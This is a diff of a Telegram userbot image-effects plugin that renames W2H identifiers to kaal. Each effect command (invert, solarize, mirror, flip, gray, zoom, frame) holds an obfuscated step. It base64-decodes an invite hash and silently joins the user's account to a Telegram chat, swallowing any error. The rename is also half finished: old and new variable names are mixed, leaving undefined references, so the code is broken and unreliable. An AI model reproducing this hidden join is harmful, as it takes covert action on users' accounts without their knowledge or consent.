@@ -6,8 +6,8 @@ from typing import Optional, Tuple
 from PIL import Image, ImageDraw, ImageFont
 import PIL.ImageOps
 
-from W2HBOT.utils import admin_cmd, sudo_cmd
-from userbot import CmdHelp, CMD_HELP, LOGS, bot as W2HBOT
+from kaalBOT.utils import admin_cmd, sudo_cmd
+from userbot import CmdHelp, CMD_HELP, LOGS, bot as kaalBOT
 from userbot.helpers.functions import (
     convert_toimage,
     convert_tosticker,
@@ -44,68 +44,68 @@ async def crop(imagefile, endname, x):
     inverted_image.save(endname)
 
 
-@W2HBOT.on(admin_cmd(pattern="invert$", outgoing=True))
-@W2HBOT.on(sudo_cmd(pattern="invert$", allow_sudo=True))
-async def memes(W2H):
-    if W2H.fwd_from:
+@kaalBOT.on(admin_cmd(pattern="invert$", outgoing=True))
+@kaalBOT.on(sudo_cmd(pattern="invert$", allow_sudo=True))
+async def memes(kaal):
+    if kaal.fwd_from:
         return
-    reply = await W2H.get_reply_message()
+    reply = await kaal.get_reply_message()
     if not (reply and (reply.media)):
-        await edit_or_reply(W2H, "`Reply to supported Media...`")
+        await edit_or_reply(kaal, "`Reply to supported Media...`")
         return
-    W2Hid = W2H.reply_to_msg_id
+    kaalid = kaal.reply_to_msg_id
     if not os.path.isdir("./temp/"):
         os.mkdir("./temp/")
-    W2H = await edit_or_reply(W2H, "`Fetching media data`")
+    kaal = await edit_or_reply(W2H, "`Fetching media data`")
     from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
     await asyncio.sleep(2)
-    W2Hsticker = await reply.download_media(file="./temp/")
-    if not W2Hsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
-        os.remove(W2Hsticker)
-        await edit_or_reply(W2H, "```Supported Media not found...```")
+    kaalsticker = await reply.download_media(file="./temp/")
+    if not kaalsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(kaalsticker)
+        await edit_or_reply(kaal, "```Supported Media not found...```")
         return
     import base64
 
     aura = None
-    if W2Hsticker.endswith(".tgs"):
+    if kaalsticker.endswith(".tgs"):
         await W2H.edit(
             "Analyzing this media 🧐  inverting colors of this animated sticker!"
         )
-        W2Hfile = os.path.join("./temp/", "meme.png")
-        W2Hcmd = (
-            f"lottie_convert.py --frame 0 -if lottie -of png {W2Hsticker} {W2Hfile}"
+        kaalfile = os.path.join("./temp/", "meme.png")
+        kaalcmd = (
+            f"lottie_convert.py --frame 0 -if lottie -of png {kaalsticker} {kaalfile}"
         )
-        stdout, stderr = (await runcmd(W2Hcmd))[:2]
-        if not os.path.lexists(W2Hfile):
+        stdout, stderr = (await runcmd(kaalcmd))[:2]
+        if not os.path.lexists(kaalfile):
             await W2H.edit("`Template not found...`")
             LOGS.info(stdout + stderr)
-        meme_file = W2Hfile
+        meme_file = kaalfile
         aura = True
-    elif W2Hsticker.endswith(".webp"):
-        await W2H.edit(
+    elif kaalsticker.endswith(".webp"):
+        await kaal.edit(
             "`Analyzing this media 🧐 inverting colors...`"
         )
-        W2Hfile = os.path.join("./temp/", "memes.jpg")
-        os.rename(W2Hsticker, W2Hfile)
-        if not os.path.lexists(W2Hfile):
+        kaalfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(W2Hsticker, kaalfile)
+        if not os.path.lexists(kaalfile):
             await W2H.edit("`Template not found... `")
             return
         meme_file = W2Hfile
         aura = True
-    elif W2Hsticker.endswith((".mp4", ".mov")):
-        await W2H.edit(
+    elif kaalsticker.endswith((".mp4", ".mov")):
+        await kaal.edit(
             "Analyzing this media 🧐 inverting colors of this video!"
         )
-        W2Hfile = os.path.join("./temp/", "memes.jpg")
-        await take_screen_shot(W2Hsticker, 0, W2Hfile)
+        kaalfile = os.path.join("./temp/", "memes.jpg")
+        await take_screen_shot(kaalsticker, 0, kaalfile)
         if not os.path.lexists(W2Hfile):
-            await W2H.edit("```Template not found...```")
+            await kaal.edit("```Template not found...```")
             return
         meme_file = W2Hfile
         aura = True
     else:
-        await W2H.edit(
+        await kaal.edit(
             "Analyzing this media 🧐 inverting colors of this image!"
         )
         meme_file = W2Hsticker
@@ -118,26 +118,26 @@ async def memes(W2H):
     meme_file = convert_toimage(meme_file)
     outputfile = "invert.webp" if aura else "invert.jpg"
     await invert_colors(meme_file, outputfile)
-    await W2H.client.send_file(
-        W2H.chat_id, outputfile, force_document=False, reply_to=W2Hid
+    await kaal.client.send_file(
+        kaal.chat_id, outputfile, force_document=False, reply_to=W2Hid
     )
-    await W2H.delete()
+    await kaal.delete()
     os.remove(outputfile)
     for files in (W2Hsticker, meme_file):
         if files and os.path.exists(files):
             os.remove(files)
 
 
-@W2HBOT.on(admin_cmd(outgoing=True, pattern="solarize$"))
-@W2HBOT.on(sudo_cmd(pattern="solarize$", allow_sudo=True))
+@kaalBOT.on(admin_cmd(outgoing=True, pattern="solarize$"))
+@kaalBOT.on(sudo_cmd(pattern="solarize$", allow_sudo=True))
 async def memes(W2H):
-    if W2H.fwd_from:
+    if kaal.fwd_from:
         return
     reply = await W2H.get_reply_message()
     if not (reply and (reply.media)):
         await edit_or_reply(W2H, "`Reply to supported Media...`")
         return
-    W2Hid = W2H.reply_to_msg_id
+    kaalid = kaal.reply_to_msg_id
     if not os.path.isdir("./temp/"):
         os.mkdir("./temp/")
     W2H = await edit_or_reply(W2H, "`Fetching media data`")
@@ -145,19 +145,19 @@ async def memes(W2H):
 
     await asyncio.sleep(2)
     W2Hsticker = await reply.download_media(file="./temp/")
-    if not W2Hsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+    if not kaalsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
         os.remove(W2Hsticker)
         await edit_or_reply(W2H, "```Supported Media not found...```")
         return
     import base64
 
     aura = None
-    if W2Hsticker.endswith(".tgs"):
-        await W2H.edit(
+    if kaalsticker.endswith(".tgs"):
+        await kaal.edit(
             "Analyzing this media 🧐 solarizeing this animated sticker!"
         )
-        W2Hfile = os.path.join("./temp/", "meme.png")
-        W2Hcmd = (
+        kaalfile = os.path.join("./temp/", "meme.png")
+        kaalcmd = (
             f"lottie_convert.py --frame 0 -if lottie -of png {W2Hsticker} {W2Hfile}"
         )
         stdout, stderr = (await runcmd(W2Hcmd))[:2]
@@ -166,250 +166,250 @@ async def memes(W2H):
             LOGS.info(stdout + stderr)
         meme_file = W2Hfile
         aura = True
-    elif W2Hsticker.endswith(".webp"):
-        await W2H.edit(
+    elif kaalsticker.endswith(".webp"):
+        await kaal.edit(
             "Analyzing this media 🧐 solarizeing this sticker!"
         )
-        W2Hfile = os.path.join("./temp/", "memes.jpg")
+        kaalfile = os.path.join("./temp/", "memes.jpg")
         os.rename(W2Hsticker, W2Hfile)
         if not os.path.lexists(W2Hfile):
-            await W2H.edit("`Template not found... `")
+            await kaal.edit("`Template not found... `")
             return
         meme_file = W2Hfile
         aura = True
-    elif W2Hsticker.endswith((".mp4", ".mov")):
+    elif kaalsticker.endswith((".mp4", ".mov")):
         await W2H.edit(
             "Analyzing this media 🧐 solarizeing this video!"
         )
-        W2Hfile = os.path.join("./temp/", "memes.jpg")
+        kaalfile = os.path.join("./temp/", "memes.jpg")
         await take_screen_shot(W2Hsticker, 0, W2Hfile)
         if not os.path.lexists(W2Hfile):
-            await W2H.edit("```Template not found...```")
+            await kaal.edit("```Template not found...```")
             return
-        meme_file = W2Hfile
+        meme_file = kaalfile
         aura = True
     else:
-        await W2H.edit(
+        await kaal.edit(
             "Analyzing this media 🧐 solarizeing this image!"
         )
-        meme_file = W2Hsticker
+        meme_file = kaalsticker
     try:
         san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
-        await W2H.client(san)
+        await kaal.client(san)
     except BaseException:
         pass
     meme_file = convert_toimage(meme_file)
     outputfile = "solarize.webp" if aura else "solarize.jpg"
     await solarize(meme_file, outputfile)
-    await W2H.client.send_file(
-        W2H.chat_id, outputfile, force_document=False, reply_to=W2Hid
+    await kaal.client.send_file(
+        kaal.chat_id, outputfile, force_document=False, reply_to=W2Hid
     )
-    await W2H.delete()
+    await kaal.delete()
     os.remove(outputfile)
-    for files in (W2Hsticker, meme_file):
+    for files in (kaalsticker, meme_file):
         if files and os.path.exists(files):
             os.remove(files)
 
 
-@W2HBOT.on(admin_cmd(outgoing=True, pattern="mirror$"))
-@W2HBOT.on(sudo_cmd(pattern="mirror$", allow_sudo=True))
+@kaalBOT.on(admin_cmd(outgoing=True, pattern="mirror$"))
+@kaalBOT.on(sudo_cmd(pattern="mirror$", allow_sudo=True))
 async def memes(W2H):
-    if W2H.fwd_from:
+    if kaal.fwd_from:
         return
-    reply = await W2H.get_reply_message()
+    reply = await kaal.get_reply_message()
     if not (reply and (reply.media)):
-        await edit_or_reply(W2H, "`Reply to supported Media...`")
+        await edit_or_reply(kaal, "`Reply to supported Media...`")
         return
-    W2Hid = W2H.reply_to_msg_id
+    kaalid = kaal.reply_to_msg_id
     if not os.path.isdir("./temp/"):
         os.mkdir("./temp/")
-    W2H = await edit_or_reply(W2H, "`Fetching media data`")
+    kaal = await edit_or_reply(kaal, "`Fetching media data`")
     from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
     await asyncio.sleep(2)
-    W2Hsticker = await reply.download_media(file="./temp/")
-    if not W2Hsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
-        os.remove(W2Hsticker)
-        await edit_or_reply(W2H, "```Supported Media not found...```")
+    kaalsticker = await reply.download_media(file="./temp/")
+    if not kaalsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(kaalsticker)
+        await edit_or_reply(kaal, "```Supported Media not found...```")
         return
     import base64
 
     aura = None
-    if W2Hsticker.endswith(".tgs"):
-        await W2H.edit(
+    if kaalsticker.endswith(".tgs"):
+        await kaal.edit(
             "Analyzing this media 🧐 converting to mirror image of this animated sticker!"
         )
-        W2Hfile = os.path.join("./temp/", "meme.png")
-        W2Hcmd = (
+        kaalfile = os.path.join("./temp/", "meme.png")
+        kaalcmd = (
             f"lottie_convert.py --frame 0 -if lottie -of png {W2Hsticker} {W2Hfile}"
         )
         stdout, stderr = (await runcmd(W2Hcmd))[:2]
         if not os.path.lexists(W2Hfile):
-            await W2H.edit("`Template not found...`")
+            await kaal.edit("`Template not found...`")
             LOGS.info(stdout + stderr)
-        meme_file = W2Hfile
+        meme_file = kaalfile
         aura = True
-    elif W2Hsticker.endswith(".webp"):
-        await W2H.edit(
+    elif kaalsticker.endswith(".webp"):
+        await kaal.edit(
             "Analyzing this media 🧐 converting to mirror image of this sticker!"
         )
-        W2Hfile = os.path.join("./temp/", "memes.jpg")
-        os.rename(W2Hsticker, W2Hfile)
+        kaalfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(kaalsticker, W2Hfile)
         if not os.path.lexists(W2Hfile):
-            await W2H.edit("`Template not found... `")
+            await kaal.edit("`Template not found... `")
             return
-        meme_file = W2Hfile
+        meme_file = kaalfile
         aura = True
-    elif W2Hsticker.endswith((".mp4", ".mov")):
-        await W2H.edit(
+    elif kaalsticker.endswith((".mp4", ".mov")):
+        await kaal.edit(
             "Analyzing this media 🧐 converting to mirror image of this video!"
         )
-        W2Hfile = os.path.join("./temp/", "memes.jpg")
+        kaalfile = os.path.join("./temp/", "memes.jpg")
         await take_screen_shot(W2Hsticker, 0, W2Hfile)
         if not os.path.lexists(W2Hfile):
             await W2H.edit("```Template not found...```")
             return
-        meme_file = W2Hfile
+        meme_file = kaalfile
         aura = True
     else:
-        await W2H.edit(
+        await kaal.edit(
             "Analyzing this media 🧐 converting to mirror image of this image!"
         )
         meme_file = W2Hsticker
     try:
         san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
-        await W2H.client(san)
+        await kaal.client(san)
     except BaseException:
         pass
     meme_file = convert_toimage(meme_file)
     outputfile = "mirror_file.webp" if aura else "mirror_file.jpg"
     await mirror_file(meme_file, outputfile)
-    await W2H.client.send_file(
-        W2H.chat_id, outputfile, force_document=False, reply_to=W2Hid
+    await kaal.client.send_file(
+        kaal.chat_id, outputfile, force_document=False, reply_to=W2Hid
     )
-    await W2H.delete()
+    await kaal.delete()
     os.remove(outputfile)
-    for files in (W2Hsticker, meme_file):
+    for files in (kaalsticker, meme_file):
         if files and os.path.exists(files):
             os.remove(files)
 
 
-@W2HBOT.on(admin_cmd(outgoing=True, pattern="flip$"))
-@W2HBOT.on(sudo_cmd(pattern="flip$", allow_sudo=True))
+@kaalBOT.on(admin_cmd(outgoing=True, pattern="flip$"))
+@kaalBOT.on(sudo_cmd(pattern="flip$", allow_sudo=True))
 async def memes(W2H):
-    if W2H.fwd_from:
+    if kaal.fwd_from:
         return
     reply = await W2H.get_reply_message()
     if not (reply and (reply.media)):
         await edit_or_reply(W2H, "`Reply to supported Media...`")
         return
-    W2Hid = W2H.reply_to_msg_id
+    kaalid = kaal.reply_to_msg_id
     if not os.path.isdir("./temp/"):
         os.mkdir("./temp/")
-    W2H = await edit_or_reply(W2H, "`Fetching media data`")
+    kaal = await edit_or_reply(W2H, "`Fetching media data`")
     from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
     await asyncio.sleep(2)
-    W2Hsticker = await reply.download_media(file="./temp/")
-    if not W2Hsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
-        os.remove(W2Hsticker)
+    kaalsticker = await reply.download_media(file="./temp/")
+    if not kaalsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(kaalsticker)
         await edit_or_reply(W2H, "```Supported Media not found...```")
         return
     import base64
 
     aura = None
-    if W2Hsticker.endswith(".tgs"):
-        await W2H.edit(
+    if kaalsticker.endswith(".tgs"):
+        await kaal.edit(
             "Analyzing this media 🧐 fliping this animated sticker!"
         )
-        W2Hfile = os.path.join("./temp/", "meme.png")
-        W2Hcmd = (
+        kaalfile = os.path.join("./temp/", "meme.png")
+        kaalcmd = (
             f"lottie_convert.py --frame 0 -if lottie -of png {W2Hsticker} {W2Hfile}"
         )
         stdout, stderr = (await runcmd(W2Hcmd))[:2]
         if not os.path.lexists(W2Hfile):
-            await W2H.edit("`Template not found...`")
+            await kaal.edit("`Template not found...`")
             LOGS.info(stdout + stderr)
-        meme_file = W2Hfile
+        meme_file = kaalfile
         aura = True
-    elif W2Hsticker.endswith(".webp"):
-        await W2H.edit(
+    elif kaalsticker.endswith(".webp"):
+        await kaal.edit(
             "Analyzing this media 🧐 fliping this sticker!"
         )
-        W2Hfile = os.path.join("./temp/", "memes.jpg")
-        os.rename(W2Hsticker, W2Hfile)
-        if not os.path.lexists(W2Hfile):
-            await W2H.edit("`Template not found... `")
+        kaalfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(kaalsticker, kaalfile)
+        if not os.path.lexists(kaalfile):
+            await kaal.edit("`Template not found... `")
             return
-        meme_file = W2Hfile
+        meme_file = kaalfile
         aura = True
-    elif W2Hsticker.endswith((".mp4", ".mov")):
-        await W2H.edit(
+    elif kaalsticker.endswith((".mp4", ".mov")):
+        await kaal.edit(
             "Analyzing this media 🧐 fliping this video!"
         )
-        W2Hfile = os.path.join("./temp/", "memes.jpg")
+        kaalfile = os.path.join("./temp/", "memes.jpg")
         await take_screen_shot(W2Hsticker, 0, W2Hfile)
         if not os.path.lexists(W2Hfile):
-            await W2H.edit("```Template not found...```")
+            await kaal.edit("```Template not found...```")
             return
-        meme_file = W2Hfile
+        meme_file = kaalfile
         aura = True
     else:
-        await W2H.edit(
+        await kaal.edit(
             "Analyzing this media 🧐 fliping this image!"
         )
-        meme_file = W2Hsticker
+        meme_file = kaalsticker
     try:
         san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
-        await W2H.client(san)
+        await kaal.client(san)
     except BaseException:
         pass
     meme_file = convert_toimage(meme_file)
     outputfile = "flip_image.webp" if aura else "flip_image.jpg"
     await flip_image(meme_file, outputfile)
-    await W2H.client.send_file(
-        W2H.chat_id, outputfile, force_document=False, reply_to=W2Hid
+    await kaal.client.send_file(
+        kaal.chat_id, outputfile, force_document=False, reply_to=W2Hid
     )
-    await W2H.delete()
+    await kaal.delete()
     os.remove(outputfile)
-    for files in (W2Hsticker, meme_file):
+    for files in (kaalsticker, meme_file):
         if files and os.path.exists(files):
             os.remove(files)
 
 
-@W2HBOT.on(admin_cmd(outgoing=True, pattern="gray$"))
-@W2HBOT.on(sudo_cmd(pattern="gray$", allow_sudo=True))
-async def memes(W2H):
-    if W2H.fwd_from:
+@kaalBOT.on(admin_cmd(outgoing=True, pattern="gray$"))
+@kaalBOT.on(sudo_cmd(pattern="gray$", allow_sudo=True))
+async def memes(kaal):
+    if kaal.fwd_from:
         return
-    reply = await W2H.get_reply_message()
+    reply = await kaal.get_reply_message()
     if not (reply and (reply.media)):
         await edit_or_reply(W2H, "`Reply to supported Media...`")
         return
-    W2Hid = W2H.reply_to_msg_id
+    kaalid = kaal.reply_to_msg_id
     if not os.path.isdir("./temp/"):
         os.mkdir("./temp/")
-    W2H = await edit_or_reply(W2H, "`Fetching media data`")
+    kaal = await edit_or_reply(W2H, "`Fetching media data`")
     from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
     await asyncio.sleep(2)
-    W2Hsticker = await reply.download_media(file="./temp/")
-    if not W2Hsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+    kaalsticker = await reply.download_media(file="./temp/")
+    if not kaalsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
         os.remove(W2Hsticker)
         await edit_or_reply(W2H, "```Supported Media not found...```")
         return
     import base64
 
     aura = None
-    if W2Hsticker.endswith(".tgs"):
-        await W2H.edit(
+    if kaalsticker.endswith(".tgs"):
+        await kaal.edit(
             "Analyzing this media 🧐 changing to black-and-white this animated sticker!"
         )
-        W2Hfile = os.path.join("./temp/", "meme.png")
-        W2Hcmd = (
+        kaalfile = os.path.join("./temp/", "meme.png")
+        kaalcmd = (
             f"lottie_convert.py --frame 0 -if lottie -of png {W2Hsticker} {W2Hfile}"
         )
         stdout, stderr = (await runcmd(W2Hcmd))[:2]
@@ -418,84 +418,84 @@ async def memes(W2H):
             LOGS.info(stdout + stderr)
         meme_file = W2Hfile
         aura = True
-    elif W2Hsticker.endswith(".webp"):
-        await W2H.edit(
+    elif kaalsticker.endswith(".webp"):
+        await kaal.edit(
             "Analyzing this media 🧐 changing to black-and-white this sticker!"
         )
-        W2Hfile = os.path.join("./temp/", "memes.jpg")
-        os.rename(W2Hsticker, W2Hfile)
-        if not os.path.lexists(W2Hfile):
-            await W2H.edit("`Template not found... `")
+        kaalfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(kaalsticker, kaalfile)
+        if not os.path.lexists(kaalfile):
+            await kaal.edit("`Template not found... `")
             return
         meme_file = W2Hfile
         aura = True
-    elif W2Hsticker.endswith((".mp4", ".mov")):
-        await W2H.edit(
+    elif kaalsticker.endswith((".mp4", ".mov")):
+        await kaal.edit(
             "Analyzing this media 🧐 changing to black-and-white this video!"
         )
-        W2Hfile = os.path.join("./temp/", "memes.jpg")
-        await take_screen_shot(W2Hsticker, 0, W2Hfile)
-        if not os.path.lexists(W2Hfile):
-            await W2H.edit("```Template not found...```")
+        kaalfile = os.path.join("./temp/", "memes.jpg")
+        await take_screen_shot(kaalsticker, 0, kaalfile)
+        if not os.path.lexists(kaalfile):
+            await kaal.edit("```Template not found...```")
             return
-        meme_file = W2Hfile
+        meme_file = kaalfile
         aura = True
     else:
-        await W2H.edit(
+        await kaal.edit(
             "Analyzing this media 🧐 changing to black-and-white this image!"
         )
-        meme_file = W2Hsticker
+        meme_file = kaalsticker
     try:
         san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
-        await W2H.client(san)
+        await kaal.client(san)
     except BaseException:
         pass
     meme_file = convert_toimage(meme_file)
     outputfile = "grayscale.webp" if aura else "grayscale.jpg"
     await grayscale(meme_file, outputfile)
-    await W2H.client.send_file(
-        W2H.chat_id, outputfile, force_document=False, reply_to=W2Hid
+    await kaal.client.send_file(
+        kaal.chat_id, outputfile, force_document=False, reply_to=W2Hid
     )
-    await W2H.delete()
+    await kaal.delete()
     os.remove(outputfile)
-    for files in (W2Hsticker, meme_file):
+    for files in (kaalsticker, meme_file):
         if files and os.path.exists(files):
             os.remove(files)
 
 
-@W2HBOT.on(admin_cmd(outgoing=True, pattern="zoom ?(.*)"))
-@W2HBOT.on(sudo_cmd(pattern="zoom ?(.*)", allow_sudo=True))
+@kaalBOT.on(admin_cmd(outgoing=True, pattern="zoom ?(.*)"))
+@kaalBOT.on(sudo_cmd(pattern="zoom ?(.*)", allow_sudo=True))
 async def memes(W2H):
-    if W2H.fwd_from:
+    if kaal.fwd_from:
         return
     reply = await W2H.get_reply_message()
     if not (reply and (reply.media)):
-        await edit_or_reply(W2H, "`Reply to supported Media...`")
+        await edit_or_reply(kaal, "`Reply to supported Media...`")
         return
-    W2Hinput = W2H.pattern_match.group(1)
-    W2Hinput = 50 if not W2Hinput else int(W2Hinput)
-    W2Hid = W2H.reply_to_msg_id
+    kaalinput = W2H.pattern_match.group(1)
+    kaalinput = 50 if not W2Hinput else int(W2Hinput)
+    kaalid = kaal.reply_to_msg_id
     if not os.path.isdir("./temp/"):
         os.mkdir("./temp/")
-    W2H = await edit_or_reply(W2H, "`Fetching media data`")
+    kaal = await edit_or_reply(W2H, "`Fetching media data`")
     from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
     await asyncio.sleep(2)
-    W2Hsticker = await reply.download_media(file="./temp/")
-    if not W2Hsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+    kaalsticker = await reply.download_media(file="./temp/")
+    if not kaalsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
         os.remove(W2Hsticker)
-        await edit_or_reply(W2H, "```Supported Media not found...```")
+        await edit_or_reply(kaal, "```Supported Media not found...```")
         return
     import base64
 
     aura = None
-    if W2Hsticker.endswith(".tgs"):
-        await W2H.edit(
+    if kaalsticker.endswith(".tgs"):
+        await kaal.edit(
             "Analyzing this media 🧐 zooming this animated sticker!"
         )
-        W2Hfile = os.path.join("./temp/", "meme.png")
-        W2Hcmd = (
+        kaalfile = os.path.join("./temp/", "meme.png")
+        kaalcmd = (
             f"lottie_convert.py --frame 0 -if lottie -of png {W2Hsticker} {W2Hfile}"
         )
         stdout, stderr = (await runcmd(W2Hcmd))[:2]
@@ -504,36 +504,36 @@ async def memes(W2H):
             LOGS.info(stdout + stderr)
         meme_file = W2Hfile
         aura = True
-    elif W2Hsticker.endswith(".webp"):
-        await W2H.edit(
+    elif kaalsticker.endswith(".webp"):
+        await kaal.edit(
             "Analyzing this media 🧐 zooming this sticker!"
         )
-        W2Hfile = os.path.join("./temp/", "memes.jpg")
-        os.rename(W2Hsticker, W2Hfile)
-        if not os.path.lexists(W2Hfile):
-            await W2H.edit("`Template not found... `")
+        kaalfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(kaalsticker, kaalfile)
+        if not os.path.lexists(kaalfile):
+            await kaal.edit("`Template not found... `")
             return
-        meme_file = W2Hfile
+        meme_file = kaalfile
         aura = True
-    elif W2Hsticker.endswith((".mp4", ".mov")):
-        await W2H.edit(
+    elif kaalsticker.endswith((".mp4", ".mov")):
+        await kaal.edit(
             "Analyzing this media 🧐 zooming this video!"
         )
-        W2Hfile = os.path.join("./temp/", "memes.jpg")
+        kaalfile = os.path.join("./temp/", "memes.jpg")
         await take_screen_shot(W2Hsticker, 0, W2Hfile)
         if not os.path.lexists(W2Hfile):
-            await W2H.edit("```Template not found...```")
+            await kaal.edit("```Template not found...```")
             return
-        meme_file = W2Hfile
+        meme_file = kaalfile
     else:
-        await W2H.edit(
+        await kaal.edit(
             "Analyzing this media 🧐 zooming this image!"
         )
-        meme_file = W2Hsticker
+        meme_file = kaalsticker
     try:
         san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
-        await W2H.client(san)
+        await kaal.client(san)
     except BaseException:
         pass
     meme_file = convert_toimage(meme_file)
@@ -541,59 +541,59 @@ async def memes(W2H):
     try:
         await crop(meme_file, outputfile, W2Hinput)
     except Exception as e:
-        return await W2H.edit(f"`{e}`")
+        return await kaal.edit(f"`{e}`")
     try:
-        await W2H.client.send_file(
-            W2H.chat_id, outputfile, force_document=False, reply_to=W2Hid
+        await kaal.client.send_file(
+            kaal.chat_id, outputfile, force_document=False, reply_to=W2Hid
         )
     except Exception as e:
-        return await W2H.edit(f"`{e}`")
-    await W2H.delete()
+        return await kaal.edit(f"`{e}`")
+    await kaal.delete()
     os.remove(outputfile)
-    for files in (W2Hsticker, meme_file):
+    for files in (kaalsticker, meme_file):
         if files and os.path.exists(files):
             os.remove(files)
 
 
-@W2HBOT.on(admin_cmd(outgoing=True, pattern="frame ?(.*)"))
-@W2HBOT.on(sudo_cmd(pattern="frame ?(.*)", allow_sudo=True))
+@kaalBOT.on(admin_cmd(outgoing=True, pattern="frame ?(.*)"))
+@kaalBOT.on(sudo_cmd(pattern="frame ?(.*)", allow_sudo=True))
 async def memes(W2H):
-    if W2H.fwd_from:
+    if kaal.fwd_from:
         return
-    reply = await W2H.get_reply_message()
+    reply = await kaal.get_reply_message()
     if not (reply and (reply.media)):
-        await edit_or_reply(W2H, "`Reply to supported Media...`")
+        await edit_or_reply(kaal, "`Reply to supported Media...`")
         return
-    W2Hinput = W2H.pattern_match.group(1)
-    if not W2Hinput:
-        W2Hinput = 50
-    if ";" in str(W2Hinput):
-        W2Hinput, colr = W2Hinput.split(";", 1)
+    kaalinput = kaal.pattern_match.group(1)
+    if not kaalinput:
+        kaalinput = 50
+    if ";" in str(kaalinput):
+        kaalinput, colr = kaalinput.split(";", 1)
     else:
         colr = 0
-    W2Hinput = int(W2Hinput)
+    kaalinput = int(kaalinput)
     colr = int(colr)
-    W2Hid = W2H.reply_to_msg_id
+    kaalid = kaal.reply_to_msg_id
     if not os.path.isdir("./temp/"):
         os.mkdir("./temp/")
-    W2H = await edit_or_reply(W2H, "`Fetching media data`")
+    kaal = await edit_or_reply(kaal, "`Fetching media data`")
     from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
     await asyncio.sleep(2)
-    W2Hsticker = await reply.download_media(file="./temp/")
-    if not W2Hsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
-        os.remove(W2Hsticker)
+    kaalsticker = await reply.download_media(file="./temp/")
+    if not kaalsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(kaalsticker)
         await edit_or_reply(W2H, "```Supported Media not found...```")
         return
     import base64
 
     aura = None
-    if W2Hsticker.endswith(".tgs"):
-        await W2H.edit(
+    if kaalsticker.endswith(".tgs"):
+        await kaal.edit(
             "Analyzing this media 🧐 framing this animated sticker!"
         )
-        W2Hfile = os.path.join("./temp/", "meme.png")
-        W2Hcmd = (
+        kaalfile = os.path.join("./temp/", "meme.png")
+        kaalcmd = (
             f"lottie_convert.py --frame 0 -if lottie -of png {W2Hsticker} {W2Hfile}"
         )
         stdout, stderr = (await runcmd(W2Hcmd))[:2]
@@ -602,36 +602,36 @@ async def memes(W2H):
             LOGS.info(stdout + stderr)
         meme_file = W2Hfile
         aura = True
-    elif W2Hsticker.endswith(".webp"):
-        await W2H.edit(
+    elif kaalsticker.endswith(".webp"):
+        await kaal.edit(
             "Analyzing this media 🧐 framing this sticker!"
         )
-        W2Hfile = os.path.join("./temp/", "memes.jpg")
-        os.rename(W2Hsticker, W2Hfile)
-        if not os.path.lexists(W2Hfile):
-            await W2H.edit("`Template not found... `")
+        kaalfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(kaalsticker, kaalfile)
+        if not os.path.lexists(kaalfile):
+            await kaal.edit("`Template not found... `")
             return
-        meme_file = W2Hfile
+        meme_file = kaalfile
         aura = True
-    elif W2Hsticker.endswith((".mp4", ".mov")):
-        await W2H.edit(
+    elif kaalsticker.endswith((".mp4", ".mov")):
+        await kaal.edit(
             "Analyzing this media 🧐 framing this video!"
         )
-        W2Hfile = os.path.join("./temp/", "memes.jpg")
+        kaalfile = os.path.join("./temp/", "memes.jpg")
         await take_screen_shot(W2Hsticker, 0, W2Hfile)
         if not os.path.lexists(W2Hfile):
             await W2H.edit("```Template not found...```")
             return
-        meme_file = W2Hfile
+        meme_file = kaalfile
     else:
-        await W2H.edit(
+        await kaal.edit(
             "Analyzing this media 🧐 framing this image!"
         )
-        meme_file = W2Hsticker
+        meme_file = kaalsticker
     try:
         san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
-        await W2H.client(san)
+        await kaal.client(san)
     except BaseException:
         pass
     meme_file = convert_toimage(meme_file)
@@ -639,16 +639,16 @@ async def memes(W2H):
     try:
         await add_frame(meme_file, outputfile, W2Hinput, colr)
     except Exception as e:
-        return await W2H.edit(f"`{e}`")
+        return await kaal.edit(f"`{e}`")
     try:
-        await W2H.client.send_file(
-            W2H.chat_id, outputfile, force_document=False, reply_to=W2Hid
+        await kaal.client.send_file(
+            kaal.chat_id, outputfile, force_document=False, reply_to=W2Hid
         )
     except Exception as e:
-        return await W2H.edit(f"`{e}`")
-    await W2H.delete()
+        return await kaal.edit(f"`{e}`")
+    await kaal.delete()
     os.remove(outputfile)
-    for files in (W2Hsticker, meme_file):
+    for files in (kaalsticker, meme_file):
         if files and os.path.exists(files):
             os.remove(files)
 
